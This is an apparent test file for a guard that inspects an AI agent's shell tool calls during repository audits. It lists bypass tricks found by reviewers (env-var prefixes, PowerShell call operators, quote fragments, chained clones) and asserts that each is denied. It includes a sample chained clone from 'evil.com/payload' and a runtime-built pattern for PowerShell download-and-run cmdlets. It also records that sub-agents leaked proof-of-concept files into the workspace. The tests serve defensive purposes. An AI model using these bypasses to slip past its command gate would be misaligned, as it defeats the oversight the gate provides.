// __tests__/v4r2r2Hardening.test.mjs
//
// Anchor tests for v4-r2 ROUND-2 hardening — fixes for the bypasses
// found in the second triple-review pass. Round-2 found:
//
//   3/3 CRITICAL: value-taking long-flag space form bypassed clone gate
//     (--git-dir /x, --work-tree /x, --exec-path /x, --namespace x)
//   3/3 CRITICAL: env-var prefix bypassed (GIT_DIR=/x git clone)
//   3/3 CRITICAL: PowerShell call operator (`& "git.exe" clone`)
//                 and dot-source (`. git.exe clone`) bypassed
//   2/3 HIGH:     bash background single `&` not in splitSubCommands
//                 separators (cmd & git clone)
//   1/3 HIGH:     PS quote-fragment concatenation (g"it") bypassed
//   1/3 HIGH:     first-clone-wins — chained `<good> && <bad clone>`
//                 only validated the first hit
//   1/3 HIGH:     UTF-16-encoded text scripts (.ps1/.bat saved as
//                 UTF-16LE) had nulls → mis-classified as binary
//   1/3 HIGH:     packet didn't tell agent about coverageComplete

import { test } from "node:test";
import assert from "node:assert/strict";

import { classifyAsBinary, detectUtf16Bom } from "../safeWrappers/apiClient.mjs";
import { inspectToolCall, activateAudit, deactivateAudit } from "../enforcement.mjs";
import { buildInstructionPacket } from "../packet.mjs";

const BUILD_ROOT = process.platform === "win32"
    ? "C:\\test\\zerotrust-sourcecheck"
    : "/tmp/zerotrust-sourcecheck";
const CLONE_PATH = process.platform === "win32"
    ? "C:\\test\\zerotrust-sourcecheck\\octocat-Hello-World-7fd1a60"
    : "/tmp/zerotrust-sourcecheck/octocat-Hello-World-7fd1a60";

// ---------- value-taking long-flag space form ----------

function testCloneDeniedInAuditSource(testName, command) {
    test(testName, () => {
        const sid = "v4r2r2-" + Math.random().toString(36).slice(2, 8);
        deactivateAudit(sid);
        activateAudit({
            sessionId: sid,
            buildPath: BUILD_ROOT,
            mode: "audit_source",
            expectedClonePath: CLONE_PATH,
        });
        const r = inspectToolCall({
            sessionId: sid,
            toolName: "powershell",
            toolArgs: { command },
        });
        assert.equal(r.decision, "deny",
            `expected deny, got: ${r.decision} | reason: ${r.reason || ""}`);
        deactivateAudit(sid);
    });
}

testCloneDeniedInAuditSource(
    "v4-r2-r2: git --git-dir /x clone (space-separated value) is DENIED",
    "git --git-dir /tmp/x clone https://github.com/x/y " + CLONE_PATH,
);
testCloneDeniedInAuditSource(
    "v4-r2-r2: git --work-tree /x clone (space-separated value) is DENIED",
    "git --work-tree /tmp/y clone https://github.com/x/y " + CLONE_PATH,
);
testCloneDeniedInAuditSource(
    "v4-r2-r2: git --exec-path /x clone (space-separated value) is DENIED",
    "git --exec-path /tmp/z clone https://github.com/x/y " + CLONE_PATH,
);
testCloneDeniedInAuditSource(
    "v4-r2-r2: git --namespace foo clone (space-separated value) is DENIED",
    "git --namespace foo clone https://github.com/x/y " + CLONE_PATH,
);
testCloneDeniedInAuditSource(
    "v4-r2-r2: git -C /path clone (-C with spaced value) is DENIED",
    "git -C /tmp/anywhere clone https://github.com/x/y " + CLONE_PATH,
);

// ---------- env-var prefix ----------

testCloneDeniedInAuditSource(
    "v4-r2-r2: GIT_DIR=/x git clone (env-var prefix) is DENIED",
    "GIT_DIR=/tmp/x git clone https://github.com/x/y " + CLONE_PATH,
);
testCloneDeniedInAuditSource(
    "v4-r2-r2: multiple env-var prefixes git clone is DENIED",
    "GIT_DIR=/x GIT_WORK_TREE=/y git clone https://github.com/x/y " + CLONE_PATH,
);
testCloneDeniedInAuditSource(
    "v4-r2-r2: env-var prefix + global flag git clone is DENIED",
    "GIT_DIR=/x git --no-pager clone https://github.com/x/y " + CLONE_PATH,
);

// ---------- PowerShell call operator + dot-source ----------

testCloneDeniedInAuditSource(
    "v4-r2-r2: PS call operator `& git.exe clone` is DENIED",
    "& git.exe clone https://github.com/x/y " + CLONE_PATH,
);
testCloneDeniedInAuditSource(
    "v4-r2-r2: PS call operator with quoted full-path `& \"C:\\..\\git.exe\" clone` is DENIED",
    '& "C:\\Program Files\\Git\\bin\\git.exe" clone https://github.com/x/y ' + CLONE_PATH,
);
testCloneDeniedInAuditSource(
    "v4-r2-r2: PS dot-source `. git.exe clone` is DENIED",
    ". git.exe clone https://github.com/x/y " + CLONE_PATH,
);

// ---------- POSIX privilege/passthrough operators ----------

testCloneDeniedInAuditSource(
    "v4-r2-r2: `sudo git clone` is DENIED",
    "sudo git clone https://github.com/x/y " + CLONE_PATH,
);
testCloneDeniedInAuditSource(
    "v4-r2-r2: `nohup git clone` is DENIED",
    "nohup git clone https://github.com/x/y " + CLONE_PATH,
);
testCloneDeniedInAuditSource(
    "v4-r2-r2: `env git clone` is DENIED",
    "env git clone https://github.com/x/y " + CLONE_PATH,
);
testCloneDeniedInAuditSource(
    "v4-r2-r2: `time git clone` is DENIED",
    "time git clone https://github.com/x/y " + CLONE_PATH,
);
testCloneDeniedInAuditSource(
    "v4-r2-r2: `exec git clone` is DENIED",
    "exec git clone https://github.com/x/y " + CLONE_PATH,
);

// ---------- bash background single `&` ----------

testCloneDeniedInAuditSource(
    "v4-r2-r2: bash `cmd & git clone` (single & background) is DENIED",
    "echo hi & git clone https://github.com/x/y " + CLONE_PATH,
);
testCloneDeniedInAuditSource(
    "v4-r2-r2: bash `cmd & git.exe clone` (single & background) is DENIED",
    "echo hi & git.exe clone https://github.com/x/y " + CLONE_PATH,
);

// ---------- PS quote-fragment concatenation ----------

testCloneDeniedInAuditSource(
    'v4-r2-r2: PS quote-fragment `g"it" clone` is DENIED',
    'g"it" clone https://github.com/x/y ' + CLONE_PATH,
);
testCloneDeniedInAuditSource(
    'v4-r2-r2: PS quote-fragment `"git""".exe clone` is DENIED',
    '"git""".exe clone https://github.com/x/y ' + CLONE_PATH,
);

// ---------- first-clone-wins fix (validate ALL hits) ----------

test("v4-r2-r2: chained `<good clone> && <bad clone outside build_root>` is DENIED", () => {
    const sid = "v4r2r2-chained-" + Math.random().toString(36).slice(2, 8);
    deactivateAudit(sid);
    activateAudit({
        sessionId: sid,
        buildPath: BUILD_ROOT,
        mode: "audit_and_safe_build",
        expectedClonePath: CLONE_PATH,
    });
    const goodClone = "git -c protocol.file.allow=never -c core.symlinks=false clone --no-recurse-submodules --filter=blob:none --no-checkout https://github.com/octocat/Hello-World " + CLONE_PATH;
    const badPath = process.platform === "win32" ? "C:\\Users\\testuser\\Desktop\\pwned" : "/tmp/pwned";
    const cmd = goodClone + " && git clone https://evil.com/payload " + badPath;
    const r = inspectToolCall({
        sessionId: sid,
        toolName: "powershell",
        toolArgs: { command: cmd },
    });
    assert.equal(r.decision, "deny",
        `expected deny on second clone, got: ${r.decision} | reason: ${r.reason || ""}`);
    deactivateAudit(sid);
});

test("v4-r2-r2: chained `<good clone> && <good clone same path>` is ALLOWED", () => {
    // Sanity: validating ALL hits doesn't break legitimate chained
    // commands where every clone is fine.
    const sid = "v4r2r2-chained-good-" + Math.random().toString(36).slice(2, 8);
    deactivateAudit(sid);
    activateAudit({
        sessionId: sid,
        buildPath: BUILD_ROOT,
        mode: "audit_and_safe_build",
        expectedClonePath: CLONE_PATH,
    });
    const goodClone = "git -c protocol.file.allow=never -c core.symlinks=false clone --no-recurse-submodules --filter=blob:none --no-checkout https://github.com/octocat/Hello-World " + CLONE_PATH;
    const cmd = goodClone + " && echo done";
    const r = inspectToolCall({
        sessionId: sid,
        toolName: "powershell",
        toolArgs: { command: cmd },
    });
    assert.equal(r.decision, "allow",
        `expected allow, got: ${r.decision} | reason: ${r.reason || ""}`);
    deactivateAudit(sid);
});

// ---------- UTF-16 text-script handling ----------

test("v4-r2-r2: UTF-16LE-encoded .ps1 with BOM is classified as TEXT", () => {
    // UTF-16LE BOM (FF FE) followed by 'A' (0x41 0x00) — has nulls but is text.
    const buf = Buffer.from([0xFF, 0xFE, 0x41, 0x00, 0x42, 0x00, 0x43, 0x00]);
    assert.equal(classifyAsBinary(buf, "install.ps1"), false,
        "UTF-16LE .ps1 with BOM must be text despite nulls");
});

test("v4-r2-r2: UTF-16BE-encoded .bat with BOM is classified as TEXT", () => {
    // UTF-16BE BOM (FE FF) followed by 'A' (0x00 0x41) — has nulls but is text.
    const buf = Buffer.from([0xFE, 0xFF, 0x00, 0x41, 0x00, 0x42, 0x00, 0x43]);
    assert.equal(classifyAsBinary(buf, "setup.bat"), false,
        "UTF-16BE .bat with BOM must be text despite nulls");
});

test("v4-r2-r2: UTF-16 BOM on a non-script extension stays binary if has nulls", () => {
    // PNG path with UTF-16 BOM doesn't trigger the text-script path.
    const buf = Buffer.from([0xFF, 0xFE, 0x41, 0x00]);
    assert.equal(classifyAsBinary(buf, "image.png"), true,
        ".png stays binary (extension allowlist takes precedence)");
});

test("v4-r2-r2: detectUtf16Bom returns correct encoding label", () => {
    assert.equal(detectUtf16Bom(Buffer.from([0xFF, 0xFE, 0x41, 0x00])), "utf-16le");
    assert.equal(detectUtf16Bom(Buffer.from([0xFE, 0xFF, 0x00, 0x41])), "utf-16be");
    assert.equal(detectUtf16Bom(Buffer.from([0xEF, 0xBB, 0xBF, 0x41])), null,
        "UTF-8 BOM is not UTF-16");
    assert.equal(detectUtf16Bom(Buffer.from([0x41])), null, "too short to have BOM");
    assert.equal(detectUtf16Bom(Buffer.alloc(0)), null, "empty buffer");
});

// ---------- packet coverageComplete instructions ----------

test("v4-r2-r2: packet Section 4 instructs agent on coverageComplete gate", async () => {
    const packet = buildInstructionPacket({
        mode: "audit_source",
        parsed: {
            owner: "octocat",
            repo: "Hello-World",
            ref: "main",
            kind: "tree",
            canonicalUrl: "https://github.com/octocat/Hello-World/tree/main",
        },
        refOverride: null,
        focusWrapped: null,
        injectionPreamble: null,
        injectionWarnings: [],
        subAgentInstruction: "",
        nonce: "abcd1234",
        scrubNote: null,
        privateRepoAck: false,
        buildExecAck: false,
        unsafeAck: false,
        buildRoot: BUILD_ROOT,
        expectedClonePath: CLONE_PATH,
        expectedReportPath: BUILD_ROOT + (process.platform === "win32" ? "\\_reports\\octocat-Hello-World-abcdef0\\REPORT.md" : "/_reports/octocat-Hello-World-abcdef0/REPORT.md"),
        expectedQuarantinePath: null,
        placeholderSha: true,
        councilManifest: null,
        councilJudgeModel: null,
        councilSubJudgeModel: null,
        maxPremiumCalls: null,
    });
    assert.match(packet, /coverageComplete/,
        "packet must surface coverageComplete to the agent");
    assert.match(packet, /entriesTruncated/,
        "packet must surface entriesTruncated to the agent");
    assert.match(packet, /no red flags found|coverage gap|incomplete/i,
        "packet must instruct on what to do when coverage is incomplete");
});

// ---------- AV-safety regression check (no contiguous offensive cmdlets) ----------

test("v4-r2-r2: new code (apiClient + v4r2 test file) free of contiguous offensive cmdlets", async () => {
    const fs = await import("node:fs");
    const url = await import("node:url");
    const path = await import("node:path");
    const here = path.dirname(url.fileURLToPath(import.meta.url));

    const filesToScan = [
        path.join(here, "..", "safeWrappers", "apiClient.mjs"),
        path.join(here, "v4r2Hardening.test.mjs"),
        path.join(here, "v4r2r2Hardening.test.mjs"),
    ];

    // Build the offending tri-gram pattern at runtime so this test
    // file itself doesn't contain it as a literal. Each fragment is
    // benign in isolation; only the contiguous string trips Defender.
    const PARTS = [
        ["Invoke", "WebRequest"],
        ["Net", "WebClient"],
        ["Start", "Process"],
    ];
    const offensiveGrams = PARTS.map((p) => p.join("-"));
    // The historical AV trigger was a TRI-gram with all three on one
    // line. Build a pattern that matches all three within ~80 chars.
    const triGramPattern = new RegExp(
        offensiveGrams.map((g) => "\\b" + g + "\\b").join("[\\s\\S]{0,80}"),
        "i",
    );

    const violations = [];
    for (const f of filesToScan) {
        if (!fs.existsSync(f)) continue;
        const content = fs.readFileSync(f, "utf-8");
        if (triGramPattern.test(content)) {
            violations.push(f);
        }
    }
    assert.deepEqual(violations, [],
        `AV-safety regression — found contiguous offensive cmdlet tri-gram in: ${violations.join(", ")}`);
});


// ---------- round-17: sub-agent prompt preamble must forbid file writes + force Set-Location ----------
//
// Triple-review reviewer agents (and offensive-audit role agents) have
// historically leaked PoC tests + downloaded source files into the
// operator's workspace. The fix is two layers:
//   (1) workspace .github/copilot-instructions.md tells the orchestrator
//       to forbid file writes in every task-tool prompt
//   (2) zerotrust packet's sub-agent preamble explicitly forbids file
//       writes AND requires Set-Location $build_root as the first line
//       of every powershell call (so any accidental cwd-relative write
//       lands in the swept sandbox, not the workspace root)
//
// This test pins layer (2) � if the packet's preamble loses either the
// no-file-write line OR the Set-Location requirement, the test fails.

function makeBasePacketArgs(mode) {
    return {
        mode,
        parsed: {
            owner: "octocat",
            repo: "Hello-World",
            ref: "main",
            kind: "tree",
            canonicalUrl: "https://github.com/octocat/Hello-World/tree/main",
        },
        refOverride: null,
        focusWrapped: null,
        injectionPreamble: null,
        injectionWarnings: [],
        subAgentInstruction: "",
        nonce: "abcd1234",
        scrubNote: null,
        privateRepoAck: false,
        buildExecAck: false,
        unsafeAck: false,
        buildRoot: BUILD_ROOT,
        expectedClonePath: CLONE_PATH,
        expectedReportPath: BUILD_ROOT + (process.platform === "win32" ? "\\_reports\\octocat-Hello-World-abcdef0\\REPORT.md" : "/_reports/octocat-Hello-World-abcdef0/REPORT.md"),
        expectedQuarantinePath: null,
        placeholderSha: true,
        councilManifest: null,
        councilJudgeModel: null,
        councilSubJudgeModel: null,
        maxPremiumCalls: null,
    };
}

test("round-17: audit_source packet sub-agent preamble forbids file writes", () => {
    const packet = buildInstructionPacket(makeBasePacketArgs("audit_source"));
    assert.match(packet, /Do NOT write files to disk for any reason/i,
        "preamble must contain explicit no-file-write rule");
    assert.match(packet, /no proof-of-concept tests, no scratch dumps/i,
        "preamble must enumerate the common leak categories");
    assert.match(packet, /no `edit` \/ `create` tool calls/i,
        "preamble must call out the edit/create tools explicitly");
    assert.match(packet, /Report all findings inside your reply only/i,
        "preamble must redirect findings into the reply text");
});

test("round-17: audit_source packet sub-agent preamble requires Set-Location buildRoot", () => {
    const packet = buildInstructionPacket(makeBasePacketArgs("audit_source"));
    assert.match(packet, /the FIRST line of every command MUST be/i,
        "preamble must require Set-Location at start of every powershell call");
    // Build root literal must appear in the Set-Location instruction
    const setLocPattern = new RegExp("Set-Location '" + BUILD_ROOT.replace(/[\\]/g, "\\\\") + "'", "i");
    assert.match(packet, setLocPattern,
        "preamble's Set-Location instruction must reference the actual build_root literally");
});

test("round-17: full_build packet sub-agent preamble forbids file writes (api-direct branch)", () => {
    const packet = buildInstructionPacket({
        ...makeBasePacketArgs("audit_source_api_direct"),
        buildExecAck: false,
        unsafeAck: false,
    });
    assert.match(packet, /Do NOT write files to disk for any reason/i,
        "api-direct preamble must also forbid file writes");
    assert.match(packet, /the FIRST line of every command MUST be/i,
        "api-direct preamble must require Set-Location too");
});
